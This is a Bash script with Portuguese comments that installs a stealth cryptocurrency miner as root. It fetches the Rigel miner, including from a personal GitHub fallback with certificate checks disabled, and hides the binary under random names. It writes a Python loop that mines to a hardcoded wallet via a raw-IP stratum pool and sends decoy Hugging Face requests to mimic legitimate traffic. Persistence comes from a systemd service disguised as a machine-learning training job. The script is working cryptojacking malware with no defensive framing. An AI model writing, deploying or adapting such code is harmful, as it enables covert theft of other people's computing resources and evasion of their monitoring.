#!/bin/bash
#
# Script de correção para HyperStealth Miner v2.5
#

echo "=== Correção para HyperStealth Miner ==="

# Verifica privilégios de root
if [ "$(id -u)" -ne 0 ]; then
  echo "Este script precisa ser executado como root"
  exit 1
fi

# Configurações
WALLET="0x0067E6557AC5096733dB091900CC9B989148C4e5.A-1"
SERVICE_NAME="mltrainer-$(hostname | md5sum | cut -c1-8)"
LOG_FILE="/var/log/ml_monitor.log"
WORK_DIR="/opt"
REPO="rigelminer/rigel"

# Função para gerar nomes aleatórios
random_name() {
  tr -dc a-z0-9 </dev/urandom | head -c 8
}

# Download correto do Rigel Miner
download_rigel() {
  echo "Baixando e instalando Rigel Miner com nomes aleatórios..."
  
  # Cria diretório temporário
  TMP_DIR="$(mktemp -d -p /tmp)"
  cd "$TMP_DIR" || exit 1
  
  # Obtém a versão mais recente
  LATEST_VERSION="$(curl -s https://api.github.com/repos/$REPO/releases/latest | grep 'tag_name' | sed -E 's/.*"v?([^"]+)".*/\1/')"
  if [ -z "$LATEST_VERSION" ]; then
    echo "Não foi possível determinar a versão mais recente, usando fixa."
    LATEST_VERSION="1.9.2"
  fi
  echo "Versão encontrada: $LATEST_VERSION"
  
  # URL de download
  DOWNLOAD_URL="https://github.com/$REPO/releases/download/v${LATEST_VERSION}/rigel-${LATEST_VERSION}-linux.tar.gz"
  echo "Download URL: $DOWNLOAD_URL"
  
  # Baixa o arquivo
  wget --no-check-certificate -q "$DOWNLOAD_URL" -O rigel.tar.gz
  if [ ! -s rigel.tar.gz ]; then
    echo "Erro: o arquivo baixado está vazio. Tentando versão fixa..."
    DOWNLOAD_URL="https://github.com/$REPO/releases/download/v1.9.2/rigel-1.9.2-linux.tar.gz"
    wget --no-check-certificate -q "$DOWNLOAD_URL" -O rigel.tar.gz
    if [ ! -s rigel.tar.gz ]; then
      echo "Erro fatal: não foi possível baixar o Rigel Miner."
      exit 1
    fi
  fi
  
  # Extrai o arquivo
  mkdir -p extracted
  tar -xzf rigel.tar.gz -C extracted
  if [ $? -ne 0 ]; then
    echo "Erro na extração, tentando sem validação de formato..."
    cd extracted
    tar -xf ../rigel.tar.gz
    cd ..
  fi
  
  # Gera nomes aleatórios
  NEW_FOLDER="module_$(random_name)"
  NEW_BINARY="trainer_$(random_name)"
  
  # Localiza o binário rigel
  ORIG_FOLDER=$(find extracted -type f -name "rigel" -o -name "Rigel" | head -n 1 | xargs dirname)
  if [ -z "$ORIG_FOLDER" ]; then
    echo "Binário não encontrado na extração. Baixando binário pré-compilado..."
    mkdir -p "$WORK_DIR/$NEW_FOLDER"
    wget --no-check-certificate -q "https://raw.githubusercontent.com/brunusansi/axjkjasjascklazi/refs/heads/main/rigel" -O "$WORK_DIR/$NEW_FOLDER/$NEW_BINARY"
    chmod +x "$WORK_DIR/$NEW_FOLDER/$NEW_BINARY"
  else
    # Move para o diretório de trabalho
    mkdir -p "$WORK_DIR/$NEW_FOLDER"
    find "$ORIG_FOLDER" -type f -exec cp {} "$WORK_DIR/$NEW_FOLDER/" \;
    
    # Renomeia o binário
    if [ -f "$WORK_DIR/$NEW_FOLDER/rigel" ]; then
      mv "$WORK_DIR/$NEW_FOLDER/rigel" "$WORK_DIR/$NEW_FOLDER/$NEW_BINARY"
    elif [ -f "$WORK_DIR/$NEW_FOLDER/Rigel" ]; then
      mv "$WORK_DIR/$NEW_FOLDER/Rigel" "$WORK_DIR/$NEW_FOLDER/$NEW_BINARY"
    fi
    chmod +x "$WORK_DIR/$NEW_FOLDER/$NEW_BINARY"
  fi
  
  # Limpa arquivos temporários
  rm -rf "$TMP_DIR"
  
  echo "Binário instalado em: $WORK_DIR/$NEW_FOLDER/$NEW_BINARY"
  echo "$WORK_DIR/$NEW_FOLDER/$NEW_BINARY"
}

# Instala dependências sem usar pip
install_dependencies() {
  echo "Instalando dependências..."
  apt-get update -qq
  apt-get install -y -qq python3-requests
  # Se precisar mais pacotes Python, instale via apt
}

# Atualiza o script de monitoramento
update_monitor_script() {
  BINARY_PATH="$1"
  echo "Atualizando script de monitoramento..."
  
  cat > /usr/local/bin/ml_monitor.py << EOF
import os, sys, time, json, socket, ssl, logging, random, requests, subprocess, signal

logging.basicConfig(
    filename='/var/log/ml_monitor.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

class StealthMiner:
    def __init__(self):
        self.wallet = os.environ.get('WALLET', '0x0067E6557AC5096733dB091900CC9B989148C4e5.A-1')
        self.binary = '$BINARY_PATH'
        self.current_stratum = None
        self.process = None
        
        logging.info(f"Usando binário: {self.binary}")
        
        if not os.path.exists(self.binary):
            logging.error(f"Binário não existe: {self.binary}")
        else:
            logging.info(f"Binário localizado com sucesso")

    def get_stratums(self):
        """Busca os servidores stratum do arquivo local"""
        try:
            with open("/etc/hyperstealth/config.json", 'r') as f:
                config = json.load(f)
            
            stratums = config['stratum_servers']
            logging.info(f"Stratums carregados: {len(stratums)} servidores")
            return stratums
        except Exception as e:
            logging.error(f"Erro ao carregar configuração: {e}")
            return [
                "stratum+tcp://18.223.152.88:5432",
                "stratum+ssl://quai.kryptex.network:8888"
            ]

    def start_miner(self, stratum):
        """Inicia o minerador"""
        if not os.path.exists(self.binary):
            logging.error("Binário do minerador não encontrado")
            return False
            
        try:
            # Mata processo anterior se existir
            if self.process and self.process.poll() is None:
                try:
                    os.kill(self.process.pid, signal.SIGTERM)
                    self.process.wait(timeout=5)
                except:
                    pass
            
            cmd = [
                self.binary,
                "-a", "quai",
                "-o", stratum,
                "-u", self.wallet,
                "-p", "x"
            ]
            
            logging.info(f"Executando: {' '.join(cmd)}")
            
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                close_fds=True
            )
            
            time.sleep(2)
            if self.process.poll() is not None:
                # Processo já terminou - algo deu errado
                stdout, stderr = self.process.communicate()
                logging.error(f"Minerador falhou ao iniciar: {stderr.decode('utf-8', errors='ignore')}")
                self.process = None
                return False
                
            logging.info(f"Minerador iniciado com sucesso!")
            return True
            
        except Exception as e:
            logging.error(f"Exceção ao iniciar minerador: {e}")
            return False

    def check_stratum(self, stratum):
        """Verifica conectividade com servidor stratum"""
        try:
            protocol, rest = stratum.split("://")
            host, port_str = rest.split(":")
            port = int(port_str)
            
            logging.info(f"Verificando conexão com {host}:{port}...")
            
            with socket.create_connection((host, port), timeout=10) as sock:
                if protocol == "stratum+ssl":
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    with context.wrap_socket(sock, server_hostname=host) as ssock:
                        logging.info(f"Conexão SSL estabelecida com {stratum}")
                        return True
                else:
                    logging.info(f"Conexão TCP estabelecida com {stratum}")
                    return True
        except Exception as e:
            logging.warning(f"Erro ao verificar {stratum}: {e}")
            return False

    def rotate_stratum(self):
        """Rotação de servidores stratum"""
        stratums = self.get_stratums()
        random.shuffle(stratums)
        
        for stratum in stratums:
            if self.check_stratum(stratum):
                if stratum != self.current_stratum:
                    logging.info(f"Alternando para {stratum}")
                    self.current_stratum = stratum
                    return self.start_miner(stratum)
                else:
                    return True
        
        return False

    def run(self):
        """Loop principal"""
        failures = 0
        
        logging.info("Iniciando sistema de mineração...")
        
        while True:
            try:
                # Verifica se o minerador está rodando
                if not self.process or self.process.poll() is not None:
                    if not self.rotate_stratum():
                        failures += 1
                        if failures > 5:
                            logging.error("Muitas falhas consecutivas, esperando...")
                            time.sleep(300)
                            failures = 0
                    else:
                        failures = 0
                
                # Simula tráfego legítimo
                try:
                    requests.get(
                        "https://datasets-server.huggingface.co/valid",
                        params={"dataset": "wiki40b", "config": "pt"},
                        headers={"User-Agent": "HuggingFace/4.35.0"},
                        timeout=15
                    )
                except:
                    pass
                
                # Verifica ocasionalmente por servidores melhores
                if random.random() < 0.2:
                    self.rotate_stratum()
                
                # Intervalo dinâmico
                sleep_time = random.randint(240, 480)
                logging.info(f"Próxima verificação em {sleep_time//60} minutos")
                time.sleep(sleep_time)

            except Exception as e:
                logging.error(f"Erro no loop principal: {e}")
                time.sleep(60)

if __name__ == "__main__":
    # Cria diretório de logs
    os.makedirs(os.path.dirname('/var/log/ml_monitor.log'), exist_ok=True)
    
    try:
        miner = StealthMiner()
        miner.run()
    except Exception as e:
        logging.critical(f"Erro fatal: {e}")
        sys.exit(1)
EOF

  chmod +x /usr/local/bin/ml_monitor.py
}

# Função principal
main() {
  # Cria diretório para configuração
  mkdir -p /etc/hyperstealth
  
  # Cria arquivo de configuração com os servidores stratum
  cat > /etc/hyperstealth/config.json << EOF
{
  "stratum_servers": [
    "stratum+tcp://18.223.152.88:5432",
    "stratum+ssl://quai.kryptex.network:8888"
  ],
  "fallback_nodes": [
    "ml-engine.googleapis.com",
    "aws.sagemaker.training.amazonaws.com",
    "api.azureml.windows.net"
  ]
}
EOF
  
  # Instala dependências
  install_dependencies
  
  # Baixa e instala o RigelMiner
  BINARY_PATH=$(download_rigel)
  if [ -z "$BINARY_PATH" ]; then
    echo "Falha ao instalar o RigelMiner"
    exit 1
  fi
  
  # Atualiza o script de monitoramento
  update_monitor_script "$BINARY_PATH"
  
  # Atualiza o serviço
  cat > /etc/systemd/system/$SERVICE_NAME.service << EOF
[Unit]
Description=Machine Learning Training Service
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
Environment="WALLET=$WALLET"
ExecStart=/usr/bin/python3 /usr/local/bin/ml_monitor.py
Restart=always
RestartSec=30
StandardOutput=append:$LOG_FILE
StandardError=append:$LOG_FILE

[Install]
WantedBy=multi-user.target
EOF
  
  # Reinicia o serviço
  systemctl daemon-reload
  systemctl restart $SERVICE_NAME
  
  # Verifica o status
  if systemctl is-active --quiet $SERVICE_NAME; then
    echo "✓ Serviço reiniciado com sucesso!"
  else
    echo "✗ Erro ao reiniciar o serviço."
    systemctl status $SERVICE_NAME
  fi
  
  echo
  echo "=== Correção Concluída ==="
  echo "Minerador configurado para carteira: $WALLET"
  echo "Nome do serviço: $SERVICE_NAME"
  echo "Arquivo de log: $LOG_FILE"
  echo "Binário: $BINARY_PATH"
  echo
  echo "Para monitorar o funcionamento:"
  echo "  systemctl status $SERVICE_NAME"
  echo "  tail -f $LOG_FILE"
}

# Executa a função principal
main
